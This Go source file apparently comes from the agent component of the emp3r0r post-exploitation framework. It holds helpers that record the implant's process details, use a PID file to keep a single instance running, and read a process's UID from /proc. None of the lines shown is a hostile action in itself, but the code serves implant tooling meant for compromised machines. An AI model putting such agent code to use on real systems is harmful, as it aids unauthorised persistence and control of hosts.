package agentw

//build +windows

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// CheckAgentProcess fill up info.emp3r0r_data.AgentProcess
func CheckAgentProcess() *emp3r0r_data.AgentProcess {
	p := &emp3r0r_data.AgentProcess{}
	p.PID = os.Getpid()
	p.PPID = os.Getppid()
	p.Cmdline = util.ProcCmdline(p.PID)
	p.Parent = util.ProcCmdline(p.PPID)

	return p
}

// IsAgentRunningPID is there any emp3r0r agent already running?
func IsAgentRunningPID() (bool, int) {
	defer func() {
		myPIDText := strconv.Itoa(os.Getpid())
		if err := ioutil.WriteFile(emp3r0r_data.PIDFile, []byte(myPIDText), 0600); err != nil {
			log.Printf("Write emp3r0r_data.PIDFile: %v", err)
		}
	}()

	pidBytes, err := ioutil.ReadFile(emp3r0r_data.PIDFile)
	if err != nil {
		return false, -1
	}
	pid, err := strconv.Atoi(string(pidBytes))
	if err != nil {
		return false, -1
	}

	_, err = os.FindProcess(pid)
	return err == nil, pid
}

// ProcUID get euid of a process
func ProcUID(pid int) string {
	f, err := os.Open(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return ""
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "Uid:") {
			uid := strings.Fields(line)[1]
			return uid
		}
	}
	return ""
}
